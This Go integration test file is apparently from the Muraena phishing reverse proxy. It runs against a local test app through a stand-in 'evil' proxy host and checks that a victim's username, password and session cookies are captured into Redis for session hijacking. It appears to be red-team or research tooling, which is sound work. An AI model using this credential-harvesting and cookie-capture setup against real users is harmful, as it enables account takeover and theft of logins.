package integration

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/gomodule/redigo/redis"
)

const (
	// scoglioMuraenaBase is the Muraena proxy URL for Scoglio tests.
	scoglioMuraenaBase = "https://evil-scoglio.muraena.anti:8443"

	// scoglioTrackingID is the test victim identifier for Scoglio tests.
	scoglioTrackingID = "SCOGTEST"
)

// skipIfNotScoglio skips the test unless both MURAENA_INTEGRATION and
// SCOGLIO_INTEGRATION env vars are set, and prerequisites are available.
func skipIfNotScoglio(t *testing.T) {
	t.Helper()

	if os.Getenv("MURAENA_INTEGRATION") == "" || os.Getenv("SCOGLIO_INTEGRATION") == "" {
		t.Skip("Skipping Scoglio integration test: set MURAENA_INTEGRATION=1 and SCOGLIO_INTEGRATION=1 to run")
	}

	// Check Redis connectivity.
	rc, err := redis.Dial("tcp", redisAddr)
	if err != nil {
		t.Skipf("Skipping Scoglio integration test: Redis not available at %s: %v", redisAddr, err)
	}
	rc.Close()

	// Check Muraena connectivity (Scoglio config).
	client := newInsecureClient()
	resp, err := client.Get(scoglioMuraenaBase + "/")
	if err != nil {
		t.Skipf("Skipping Scoglio integration test: Muraena not available at %s: %v", scoglioMuraenaBase, err)
	}
	resp.Body.Close()
}

// scoglioLogin performs a login through the Muraena proxy to Scoglio,
// returning the HTTP client (with cookies set) and the response body.
func scoglioLogin(t *testing.T, email, password string) (*http.Client, string) {
	t.Helper()

	client := newInsecureClient()

	// Step 1: GET login page with tracking ID.
	loginURL := fmt.Sprintf("%s/login?session=%s", scoglioMuraenaBase, scoglioTrackingID)
	resp, err := client.Get(loginURL)
	if err != nil {
		t.Fatalf("Failed to GET Scoglio login page: %v", err)
	}
	resp.Body.Close()

	if resp.StatusCode != 200 {
		t.Fatalf("Expected 200 for Scoglio login page, got %d", resp.StatusCode)
	}

	// Step 2: POST login form with credentials.
	// The hidden field submit_login=1 ensures a trailing & after password,
	// which is required for Muraena's InnerSubstring credential extractor.
	formData := url.Values{
		"email":        {email},
		"password":     {password},
		"submit_login": {"1"},
	}

	postURL := fmt.Sprintf("%s/login", scoglioMuraenaBase)
	resp, err = client.Post(postURL, "application/x-www-form-urlencoded", strings.NewReader(formData.Encode()))
	if err != nil {
		t.Fatalf("Failed to POST Scoglio login form: %v", err)
	}
	body, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()

	return client, string(body)
}

// TestScoglioCookieCapture verifies that all 3 session cookies
// (MURAENA_SESS, NECRO_BRO, JSESSIONID) are captured in Redis
// with valid expiry timestamps after logging in through Muraena.
func TestScoglioCookieCapture(t *testing.T) {
	skipIfNotScoglio(t)
	flushRedis(t)

	scoglioLogin(t, "admin@scoglio.local", "Admin123!")

	// Allow time for cookie processing.
	time.Sleep(2 * time.Second)

	rc := newRedisConn(t)
	defer rc.Close()

	cookieNames := []string{"MURAENA_SESS", "NECRO_BRO", "JSESSIONID"}
	for _, name := range cookieNames {
		cookieKey := fmt.Sprintf("victim:%s:cookiejar:%s", scoglioTrackingID, name)
		expires, err := redis.String(rc.Do("HGET", cookieKey, "expires"))
		if err != nil {
			keys, _ := redis.Strings(rc.Do("KEYS", fmt.Sprintf("victim:%s:*", scoglioTrackingID)))
			t.Fatalf("Failed to get %s expires from Redis (key: %s). Available keys: %v. Error: %v",
				name, cookieKey, keys, err)
		}

		t.Logf("%s expires value in Redis: %s", name, expires)

		// Verify it's not the Go zero time.
		if strings.Contains(expires, "0001-01-01") {
			t.Errorf("%s has Go zero time expiry: %s", name, expires)
		}

		// Parse and verify it's at least ~47 hours in the future.
		const timeLayout = "2006-01-02 15:04:05 -0700 MST"
		parsed, err := time.Parse(timeLayout, expires)
		if err != nil {
			t.Fatalf("Failed to parse %s expires timestamp '%s': %v", name, expires, err)
		}

		untilExpiry := time.Until(parsed)
		if untilExpiry < 47*time.Hour {
			t.Errorf("%s expiry is only %v in the future (expected at least ~47h)", name, untilExpiry)
		}

		if parsed.Unix() < 1 {
			t.Errorf("%s Unix timestamp is negative or zero: %d", name, parsed.Unix())
		}

		t.Logf("%s expiry is valid: %v (Unix: %d, %v from now)", name, parsed, parsed.Unix(), untilExpiry)
	}
}

// TestScoglioCredentialCapture verifies that Muraena extracts the
// username and password from the login form POST and stores them in Redis.
func TestScoglioCredentialCapture(t *testing.T) {
	skipIfNotScoglio(t)
	flushRedis(t)

	scoglioLogin(t, "admin@scoglio.local", "Admin123!")

	// Allow time for processing.
	time.Sleep(2 * time.Second)

	rc := newRedisConn(t)
	defer rc.Close()

	// Check Username credential (creds:0).
	usernameKey := fmt.Sprintf("victim:%s:creds:0", scoglioTrackingID)
	usernameLabel, err := redis.String(rc.Do("HGET", usernameKey, "key"))
	if err != nil {
		keys, _ := redis.Strings(rc.Do("KEYS", fmt.Sprintf("victim:%s:*", scoglioTrackingID)))
		t.Fatalf("Failed to get Username label from Redis (key: %s). Available keys: %v. Error: %v",
			usernameKey, keys, err)
	}
	usernameVal, _ := redis.String(rc.Do("HGET", usernameKey, "val"))

	t.Logf("Credential 0: key=%s, val=%s", usernameLabel, usernameVal)

	if usernameLabel != "Username" {
		t.Errorf("Expected credential label 'Username', got '%s'", usernameLabel)
	}
	if usernameVal != "admin@scoglio.local" {
		t.Errorf("Expected username 'admin@scoglio.local', got '%s'", usernameVal)
	}

	// Check Password credential (creds:1).
	passwordKey := fmt.Sprintf("victim:%s:creds:1", scoglioTrackingID)
	passwordLabel, err := redis.String(rc.Do("HGET", passwordKey, "key"))
	if err != nil {
		t.Fatalf("Failed to get Password label from Redis (key: %s). Error: %v", passwordKey, err)
	}
	passwordVal, _ := redis.String(rc.Do("HGET", passwordKey, "val"))

	t.Logf("Credential 1: key=%s, val=%s", passwordLabel, passwordVal)

	if passwordLabel != "Password" {
		t.Errorf("Expected credential label 'Password', got '%s'", passwordLabel)
	}
	if passwordVal != "Admin123!" {
		t.Errorf("Expected password 'Admin123!', got '%s'", passwordVal)
	}
}

// TestScoglioNoPhantomVictims verifies that untracked requests to various
// Scoglio endpoints do not create phantom victim entries in Redis.
func TestScoglioNoPhantomVictims(t *testing.T) {
	skipIfNotScoglio(t)
	flushRedis(t)

	client := newInsecureClient()

	// Make untracked requests (no session parameter).
	paths := []string{
		"/",
		"/login",
		"/signup",
		"/static/tailwind.min.css",
	}

	for _, path := range paths {
		resp, err := client.Get(scoglioMuraenaBase + path)
		if err != nil {
			t.Logf("Warning: request to %s failed: %v", path, err)
			continue
		}
		resp.Body.Close()
	}

	// Allow processing time.
	time.Sleep(1 * time.Second)

	// Verify zero victims were created.
	rc := newRedisConn(t)
	defer rc.Close()

	victims, err := redis.Strings(rc.Do("LRANGE", "victims", "0", "-1"))
	if err != nil && err != redis.ErrNil {
		t.Fatalf("Failed to query victims list: %v", err)
	}

	if len(victims) > 0 {
		t.Errorf("Expected 0 phantom victims, but found %d: %v", len(victims), victims)
	} else {
		t.Log("No phantom victims created from untracked Scoglio requests")
	}
}

// TestScoglioTrackedRequestCreatesVictim verifies that a request with a
// valid tracking ID creates exactly one victim in Redis.
func TestScoglioTrackedRequestCreatesVictim(t *testing.T) {
	skipIfNotScoglio(t)
	flushRedis(t)

	client := newInsecureClient()

	// Make a tracked request.
	trackedURL := fmt.Sprintf("%s/login?session=%s", scoglioMuraenaBase, scoglioTrackingID)
	resp, err := client.Get(trackedURL)
	if err != nil {
		t.Fatalf("Failed to GET tracked Scoglio URL: %v", err)
	}
	resp.Body.Close()

	// Allow processing time.
	time.Sleep(1 * time.Second)

	// Verify exactly one victim was created with the correct ID.
	rc := newRedisConn(t)
	defer rc.Close()

	victims, err := redis.Strings(rc.Do("LRANGE", "victims", "0", "-1"))
	if err != nil {
		t.Fatalf("Failed to query victims list: %v", err)
	}

	if len(victims) != 1 {
		t.Fatalf("Expected exactly 1 victim, got %d: %v", len(victims), victims)
	}

	if victims[0] != scoglioTrackingID {
		t.Errorf("Expected victim ID %s, got %s", scoglioTrackingID, victims[0])
	}

	// Verify victim data exists.
	victimKey := fmt.Sprintf("victim:%s", scoglioTrackingID)
	id, err := redis.String(rc.Do("HGET", victimKey, "id"))
	if err != nil {
		t.Fatalf("Failed to get victim ID from Redis: %v", err)
	}

	if id != scoglioTrackingID {
		t.Errorf("Victim ID in Redis hash is %s, expected %s", id, scoglioTrackingID)
	}

	// Verify user agent was captured.
	ua, err := redis.String(rc.Do("HGET", victimKey, "ua"))
	if err != nil {
		t.Fatalf("Failed to get victim UA from Redis: %v", err)
	}
	if ua != testUserAgent {
		t.Errorf("Victim UA mismatch: got %s, expected %s", ua, testUserAgent)
	}

	t.Logf("Victim %s created successfully with correct UA", scoglioTrackingID)
}

// TestScoglioPostAuthPageRequiresSession verifies that accessing the
// dashboard without a valid session redirects to /login.
// This is important for necrobrowser: it confirms that a hijacked session
// can access protected pages and that the auth middleware works.
func TestScoglioPostAuthPageRequiresSession(t *testing.T) {
	skipIfNotScoglio(t)

	// Create a client that does NOT follow redirects.
	client := newInsecureClient()
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	resp, err := client.Get(scoglioMuraenaBase + "/dashboard")
	if err != nil {
		t.Fatalf("Failed to GET /dashboard: %v", err)
	}
	resp.Body.Close()

	if resp.StatusCode != http.StatusFound {
		t.Fatalf("Expected 302 redirect for unauthenticated /dashboard, got %d", resp.StatusCode)
	}

	location := resp.Header.Get("Location")
	if !strings.Contains(location, "/login") {
		t.Errorf("Expected redirect to /login, got Location: %s", location)
	}

	t.Logf("Unauthenticated /dashboard correctly redirects to: %s", location)
}
